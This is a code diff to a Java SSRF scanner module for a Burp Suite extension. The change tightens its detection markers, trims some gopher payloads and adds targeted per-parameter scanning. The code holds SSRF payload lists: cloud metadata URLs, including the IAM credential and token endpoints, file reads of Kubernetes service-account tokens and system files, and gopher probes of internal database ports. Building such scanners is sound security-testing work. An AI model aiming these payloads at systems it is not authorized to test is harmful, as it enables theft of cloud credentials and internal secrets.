@@ -8,13 +8,13 @@ import burp.api.montoya.http.message.requests.HttpRequest;
 import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
+import com.omnistrike.framework.PayloadEncoder;
 
 import com.omnistrike.model.*;
 
-import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
-
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.regex.Pattern;
 
@@ -30,55 +30,46 @@ public class SsrfScanner implements ScanModule {
     private DeduplicationStore dedup;
     private FindingsStore findingsStore;
     private CollaboratorManager collaboratorManager;
+    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
+    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
 
     // Cloud metadata endpoints
+    // Cloud metadata endpoints — markers use REQUIRE_ALL: prefix to require ALL markers (not just one).
+    // Single generic words like "id", "region", "name" match normal web pages.
+    // Use cloud-specific multi-word markers or REQUIRE_ALL to require multiple matches.
     private static final String[][] CLOUD_METADATA = {
-            // AWS IMDSv1
-            {"http://169.254.169.254/latest/meta-data/", "ami-id|instance-id|instance-type|hostname|local-ipv4", "AWS IMDSv1 metadata"},
-            {"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId|SecretAccessKey|Token", "AWS IAM credentials"},
-            {"http://169.254.169.254/latest/user-data", "", "AWS user-data"},
-            {"http://169.254.169.254/latest/dynamic/instance-identity/document", "accountId|region|instanceId", "AWS instance identity"},
-            // GCP
-            {"http://metadata.google.internal/computeMetadata/v1/", "attributes|hostname|zone", "GCP metadata"},
+            // AWS IMDSv1 — these return plain-text directory listings with specific AWS paths
+            {"http://169.254.169.254/latest/meta-data/", "REQUIRE_ALL:ami-id,instance-id", "AWS IMDSv1 metadata"},
+            {"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId", "AWS IAM credentials"},
+            {"http://169.254.169.254/latest/dynamic/instance-identity/document", "REQUIRE_ALL:accountId,instanceId", "AWS instance identity"},
+            // GCP — requires Metadata-Flavor header, responses are structured
+            {"http://metadata.google.internal/computeMetadata/v1/", "REQUIRE_ALL:attributes/,hostname", "GCP metadata"},
             {"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "access_token", "GCP service account token"},
-            {"http://169.254.169.254/computeMetadata/v1/", "attributes", "GCP metadata (IP)"},
-            // Azure
-            {"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "vmId|location|name", "Azure instance metadata"},
+            // Azure — JSON responses with specific nested structure
+            {"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "REQUIRE_ALL:vmId,resourceGroupName", "Azure instance metadata"},
             {"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "access_token", "Azure managed identity token"},
-            // DigitalOcean
-            {"http://169.254.169.254/metadata/v1/", "hostname|region|interfaces", "DigitalOcean metadata"},
+            // DigitalOcean — structured metadata
+            {"http://169.254.169.254/metadata/v1/", "REQUIRE_ALL:droplet_id,interfaces", "DigitalOcean metadata"},
             // Alibaba Cloud
-            {"http://100.100.100.200/latest/meta-data/", "instance-id|hostname", "Alibaba Cloud metadata"},
-            // Oracle Cloud
-            {"http://169.254.169.254/opc/v2/instance/", "id|displayName|region", "Oracle Cloud metadata"},
+            {"http://100.100.100.200/latest/meta-data/", "REQUIRE_ALL:instance-id,hostname", "Alibaba Cloud metadata"},
+            // Oracle Cloud — JSON with displayName
+            {"http://169.254.169.254/opc/v2/instance/", "REQUIRE_ALL:displayName,compartmentId", "Oracle Cloud metadata"},
             // Kubernetes
-            {"https://kubernetes.default.svc/api/v1/", "APIResourceList|namespaces", "Kubernetes API"},
+            {"https://kubernetes.default.svc/api/v1/", "APIResourceList", "Kubernetes API"},
             // Hetzner Cloud
-            {"http://169.254.169.254/hetzner/v1/metadata", "hostname|instance-id", "Hetzner Cloud metadata"},
-            // Packet/Equinix Metal
-            {"http://metadata.packet.net/metadata", "id|hostname|plan", "Packet/Equinix metadata"},
-            // OpenStack
-            {"http://169.254.169.254/openstack/latest/meta_data.json", "uuid|hostname|name", "OpenStack metadata"},
-            // IBM Cloud
-            {"http://169.254.169.254/metadata/v1/", "id|name|primary_network", "IBM Cloud metadata"},
-            // Linode
-            {"http://169.254.169.254/v1/", "id|label|region", "Linode metadata"},
-            // AWS IMDSv1 additional
-            {"http://169.254.169.254/latest/meta-data/local-ipv4", "REGEX:\\d+\\.\\d+\\.\\d+\\.\\d+", "AWS local IPv4"},
-            {"http://169.254.169.254/latest/meta-data/public-ipv4", "REGEX:\\d+\\.\\d+\\.\\d+\\.\\d+", "AWS public IPv4"},
+            {"http://169.254.169.254/hetzner/v1/metadata", "REQUIRE_ALL:instance-id,public-ipv4", "Hetzner Cloud metadata"},
+            // Packet/Equinix Metal — JSON with specific fields
+            {"http://metadata.packet.net/metadata", "REQUIRE_ALL:facility,plan", "Packet/Equinix metadata"},
+            // OpenStack — JSON with uuid
+            {"http://169.254.169.254/openstack/latest/meta_data.json", "REQUIRE_ALL:uuid,availability_zone", "OpenStack metadata"},
+            // AWS IMDSv1 additional — highly specific markers
             {"http://169.254.169.254/latest/meta-data/hostname", "ec2.internal|compute.amazonaws", "AWS hostname"},
-            // GCP additional
-            {"http://metadata.google.internal/computeMetadata/v1/project/project-id", "", "GCP project ID"},
-            {"http://metadata.google.internal/computeMetadata/v1/instance/hostname", ".", "GCP instance hostname"},
             // Azure additional
-            {"http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", "vmId|name|resourceGroupName", "Azure compute metadata"},
+            {"http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", "REQUIRE_ALL:vmId,resourceGroupName", "Azure compute metadata"},
             // Docker / Container metadata
-            {"http://172.17.0.1:2375/version", "Version|ApiVersion", "Docker API (unauth)"},
-            {"http://172.17.0.1:2376/version", "Version|ApiVersion", "Docker API TLS (unauth)"},
+            {"http://172.17.0.1:2375/version", "REQUIRE_ALL:ApiVersion,GoVersion", "Docker API (unauth)"},
             // Consul
-            {"http://127.0.0.1:8500/v1/agent/self", "Config|Member", "Consul agent API"},
-            // Rancher metadata
-            {"http://rancher-metadata/latest/self/container", "name|service_name", "Rancher metadata"},
+            {"http://127.0.0.1:8500/v1/agent/self", "REQUIRE_ALL:Config,Member", "Consul agent API"},
     };
 
     // Localhost bypass payloads
@@ -146,8 +137,6 @@ public class SsrfScanner implements ScanModule {
             "dict://127.0.0.1:6379/INFO",
             "ftp://127.0.0.1/",
             "jar:https://example.com!/",
-            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",  // Redis RESP via gopher
-            "gopher://127.0.0.1:11211/_stats%0d%0a",                  // Memcached via gopher
             "tftp://127.0.0.1/test",                                    // TFTP protocol
             "ldap://127.0.0.1/dc=example,dc=com",                      // LDAP protocol
             "file:///proc/self/fd/0",
@@ -156,7 +145,6 @@ public class SsrfScanner implements ScanModule {
             "file:///proc/1/cmdline",
             "file:///c:/windows/system.ini",
             "file:///c:/inetpub/wwwroot/web.config",
-            "gopher://127.0.0.1:25/_EHLO%0d%0a",              // SMTP via gopher
             "gopher://127.0.0.1:27017/_test",                    // MongoDB via gopher
             "gopher://127.0.0.1:5432/_test",                     // PostgreSQL via gopher
             "gopher://127.0.0.1:3306/_test",                     // MySQL via gopher
@@ -167,11 +155,12 @@ public class SsrfScanner implements ScanModule {
             "file:///var/run/secrets/kubernetes.io/serviceaccount/token", // K8s service account
     };
 
-    // Patterns indicating successful internal access
+    // Patterns indicating successful internal access — only highly specific markers
+    // Removed overly generic words like "hostname" that appear in normal HTML pages
     private static final Pattern INTERNAL_RESPONSE_PATTERNS = Pattern.compile(
-            "root:x:|ami-id|instance-id|access_token|AccessKeyId|SecretAccessKey|" +
-                    "vmId|accountId|\\[extensions\\]|\\[fonts\\]|Linux version|" +
-                    "APIResourceList|hostname|local-ipv4",
+            "root:x:0:0:|ami-[0-9a-f]+|instance-id|AccessKeyId|SecretAccessKey|" +
+                    "vmId|accountId|\\[extensions\\]|\\[fonts\\]|Linux version \\d|" +
+                    "APIResourceList|local-ipv4|access_token",
             Pattern.CASE_INSENSITIVE
     );
 
@@ -214,11 +203,25 @@ public class SsrfScanner implements ScanModule {
     }
 
     @Override
+    public List<Finding> processHttpFlowForParameter(
+            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
+        HttpRequest request = requestResponse.request();
+        String urlPath = extractPath(request.url());
+        List<SsrfTarget> targets = extractTargets(request);
+        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
+        return runSsrfTargets(requestResponse, targets, urlPath);
+    }
+
+    @Override
     public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
         HttpRequest request = requestResponse.request();
         String urlPath = extractPath(request.url());
         List<SsrfTarget> targets = extractTargets(request);
+        return runSsrfTargets(requestResponse, targets, urlPath);
+    }
 
+    private List<Finding> runSsrfTargets(HttpRequestResponse requestResponse,
+                                          List<SsrfTarget> targets, String urlPath) {
         for (SsrfTarget target : targets) {
             if (!dedup.markIfNew("ssrf-scanner", urlPath, target.name)) continue;
 
@@ -242,21 +245,25 @@ public class SsrfScanner implements ScanModule {
         }
 
         // Phase 2: Cloud metadata endpoint probing
+        if (oobConfirmedParams.contains(target.name)) return;
         if (config.getBool("ssrf.metadata.enabled", true)) {
             testCloudMetadata(original, target, url);
         }
 
         // Phase 3: Localhost bypass techniques
+        if (oobConfirmedParams.contains(target.name)) return;
         if (config.getBool("ssrf.localhost.enabled", true)) {
             testLocalhostBypasses(original, target, url);
         }
 
         // Phase 3.5: DNS rebinding via rbndr.us
+        if (oobConfirmedParams.contains(target.name)) return;
         if (config.getBool("ssrf.rebinding.enabled", true)) {
             testDnsRebinding(original, target, url);
         }
 
         // Phase 4: Protocol smuggling (aggressive only)
+        if (oobConfirmedParams.contains(target.name)) return;
         if (aggressiveMode && config.getBool("ssrf.protocol.enabled", true)) {
             testProtocolSmuggling(original, target, url);
         }
@@ -269,7 +276,15 @@ public class SsrfScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> httpSentRequest = new AtomicReference<>();
         String collabPayload = collaboratorManager.generatePayload(
                 "ssrf-scanner", url, target.name, "SSRF OOB HTTP",
-                interaction -> reportOobFinding(interaction, url, target, "HTTP/DNS", httpSentRequest.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
+                    // fires on a 5-second interval so this race is rare, but when it happens the 50ms
+                    // wait is almost always enough for the sending thread to complete its set() call.
+                    for (int _w = 0; _w < 10 && httpSentRequest.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, target, "HTTP/DNS", httpSentRequest.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (collabPayload == null) return;
 
         // URL-encode the collaborator domain for double-encoding bypass
@@ -300,7 +315,13 @@ public class SsrfScanner implements ScanModule {
         AtomicReference<HttpRequestResponse> dnsSentRequest = new AtomicReference<>();
         String dnsPayload = collaboratorManager.generatePayload(
                 "ssrf-scanner", url, target.name, "SSRF OOB DNS-only",
-                interaction -> reportOobFinding(interaction, url, target, "DNS-only", dnsSentRequest.get()));
+                interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && dnsSentRequest.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    reportOobFinding(interaction, url, target, "DNS-only", dnsSentRequest.get());  // may be null if callback fires before set() — finding is still reported
+                });
         if (dnsPayload != null) {
             HttpRequestResponse dnsResult = sendPayload(original, target, dnsPayload); // Just the hostname, no scheme
             dnsSentRequest.set(dnsResult);
@@ -312,13 +333,19 @@ public class SsrfScanner implements ScanModule {
         String headerCollab = collaboratorManager.generatePayload(
                 "ssrf-scanner", url, target.name, "SSRF OOB Host header",
                 interaction -> {
+                    // Brief spin-wait to let the sending thread complete set()
+                    for (int _w = 0; _w < 10 && hostSentRequest.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    oobConfirmedParams.add(target.name);
                     findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                     "SSRF via Host Header Injection",
                                     Severity.HIGH, Confidence.CERTAIN)
                             .url(url).parameter("Host header")
                             .evidence("Collaborator " + interaction.type() + " interaction from " + interaction.clientIp())
                             .description("Server followed a manipulated Host header to make an external request.")
-                            .requestResponse(hostSentRequest.get())
+                            .requestResponse(hostSentRequest.get())  // may be null if callback fires before set() — finding is still reported
+                            .payload("SSRF OOB Host header")
                             .build());
                 });
         if (headerCollab != null) {
@@ -337,6 +364,8 @@ public class SsrfScanner implements ScanModule {
 
     private void reportOobFinding(Interaction interaction, String url, SsrfTarget target, String method,
                                     HttpRequestResponse requestResponse) {
+        // Mark parameter as confirmed — skip all remaining phases
+        oobConfirmedParams.add(target.name);
         findingsStore.addFinding(Finding.builder("ssrf-scanner",
                         "SSRF Confirmed (Out-of-Band " + method + ")",
                         Severity.CRITICAL, Confidence.CERTAIN)
@@ -347,6 +376,7 @@ public class SsrfScanner implements ScanModule {
                         + interaction.type().name() + " request to the Collaborator server when "
                         + "parameter '" + target.name + "' was injected with a Collaborator URL.")
                 .requestResponse(requestResponse)
+                .payload(interaction.id().toString())
                 .build());
         api.logging().logToOutput("[SSRF] Confirmed OOB interaction! " + url + " param=" + target.name);
     }
@@ -375,31 +405,71 @@ public class SsrfScanner implements ScanModule {
             // Check if response contains expected cloud metadata patterns
             if (status == 200 && !body.equals(baselineBody)) {
                 if (!expectedPatterns.isEmpty()) {
-                    for (String pattern : expectedPatterns.split("\\|")) {
-                        if (body.contains(pattern.trim())) {
-                            Severity severity = description.contains("credential") || description.contains("token")
-                                    ? Severity.CRITICAL : Severity.HIGH;
-                            findingsStore.addFinding(Finding.builder("ssrf-scanner",
-                                            "SSRF: " + description + " accessible",
-                                            severity, Confidence.FIRM)
-                                    .url(url).parameter(target.name)
-                                    .evidence("Metadata URL: " + metaUrl + " | Response contains: " + pattern.trim())
-                                    .description("Cloud metadata endpoint accessible via SSRF. " + description + ".")
-                                    .requestResponse(result)
-                                    .build());
-                            break;
+                    boolean confirmed = false;
+                    String matchEvidence = "";
+
+                    if (expectedPatterns.startsWith("REQUIRE_ALL:")) {
+                        // All markers must be present — prevents FPs from generic single-word matches
+                        String[] required = expectedPatterns.substring("REQUIRE_ALL:".length()).split(",");
+                        boolean allFound = true;
+                        StringBuilder evidence = new StringBuilder();
+                        for (String marker : required) {
+                            String trimmed = marker.trim();
+                            if (!body.contains(trimmed)) {
+                                allFound = false;
+                                break;
+                            }
+                            if (evidence.length() > 0) evidence.append(", ");
+                            evidence.append(trimmed);
+                        }
+                        if (allFound && required.length >= 2) {
+                            // Also verify these markers were NOT in the baseline response
+                            boolean allNewToBaseline = false;
+                            for (String marker : required) {
+                                if (!baselineBody.contains(marker.trim())) {
+                                    allNewToBaseline = true;  // At least one marker is new
+                                    break;
+                                }
+                            }
+                            if (allNewToBaseline) {
+                                confirmed = true;
+                                matchEvidence = evidence.toString();
+                            }
+                        }
+                    } else {
+                        // OR matching — but only for highly specific markers
+                        for (String pattern : expectedPatterns.split("\\|")) {
+                            String trimmed = pattern.trim();
+                            boolean patternMatched;
+                            if (trimmed.startsWith("REGEX:")) {
+                                patternMatched = Pattern.compile(trimmed.substring(6)).matcher(body).find();
+                            } else {
+                                patternMatched = body.contains(trimmed) && !baselineBody.contains(trimmed);
+                            }
+                            if (patternMatched) {
+                                confirmed = true;
+                                matchEvidence = trimmed;
+                                break;
+                            }
                         }
                     }
-                } else if (body.length() > 10) {
-                    findingsStore.addFinding(Finding.builder("ssrf-scanner",
-                                    "Potential SSRF: " + description,
-                                    Severity.MEDIUM, Confidence.TENTATIVE)
-                            .url(url).parameter(target.name)
-                            .evidence("Metadata URL: " + metaUrl + " returned non-empty response (len=" + body.length() + ")")
-                            .description("Cloud metadata endpoint returned data. Verify manually.")
-                            .requestResponse(result)
-                            .build());
+
+                    if (confirmed) {
+                        Severity severity = description.contains("credential") || description.contains("token")
+                                ? Severity.CRITICAL : Severity.HIGH;
+                        findingsStore.addFinding(Finding.builder("ssrf-scanner",
+                                        "SSRF: " + description + " accessible",
+                                        severity, Confidence.FIRM)
+                                .url(url).parameter(target.name)
+                                .evidence("Metadata URL: " + metaUrl + " | Response contains: " + matchEvidence)
+                                .description("Cloud metadata endpoint accessible via SSRF. " + description + ".")
+                                .requestResponse(result)
+                                .payload(metaUrl)
+                                .responseEvidence(matchEvidence)
+                                .build());
+                    }
                 }
+                // Removed: empty-pattern fallback that reported on any non-empty response
             }
             perHostDelay();
         }
@@ -422,6 +492,7 @@ public class SsrfScanner implements ScanModule {
                                 + "The server can reach the internal metadata service. "
                                 + "If the application makes requests with custom headers, token retrieval may be possible.")
                         .requestResponse(imdsv2Result)
+                        .payload(imdsv2Url)
                         .build());
             }
         }
@@ -467,6 +538,7 @@ public class SsrfScanner implements ScanModule {
                             .evidence("Payload: " + payload + " | Internal data in response")
                             .description("Internal resource accessed via URL parsing bypass technique.")
                             .requestResponse(result)
+                            .payload(payload)
                             .build());
                     return;
                 }
@@ -503,6 +575,7 @@ public class SsrfScanner implements ScanModule {
                                     + " vs baseline: " + baselineLen)
                             .description("Localhost access achieved via IP bypass technique.")
                             .requestResponse(result)
+                            .payload(bypass)
                             .build());
                     return; // One confirmed bypass is enough
                 }
@@ -537,6 +610,7 @@ public class SsrfScanner implements ScanModule {
                             .evidence("Protocol payload: " + payload + " | Response contains internal data")
                             .description("Protocol smuggling successful. Server followed " + proto + " URI scheme.")
                             .requestResponse(result)
+                            .payload(payload)
                             .build());
                 }
             }
@@ -590,6 +664,7 @@ public class SsrfScanner implements ScanModule {
                                         + "bypassing SSRF filters that only validate the initial DNS resolution. "
                                         + "Rebinding pair: " + description)
                                 .requestResponse(result)
+                                .payload(payload)
                                 .build());
                         return; // One confirmed rebinding is enough
                     }
@@ -614,15 +689,12 @@ public class SsrfScanner implements ScanModule {
         switch (target.type) {
             case QUERY:
                 return request.withUpdatedParameters(
-                        HttpParameter.urlParameter(target.name,
-                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
             case BODY:
                 return request.withUpdatedParameters(
-                        HttpParameter.bodyParameter(target.name,
-                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
             case COOKIE:
-                return request.withUpdatedParameters(
-                        HttpParameter.cookieParameter(target.name, payload));
+                return PayloadEncoder.injectCookie(request, target.name, payload);
             case JSON:
                 return injectJsonPayload(request, target.name, payload);
             case HEADER:
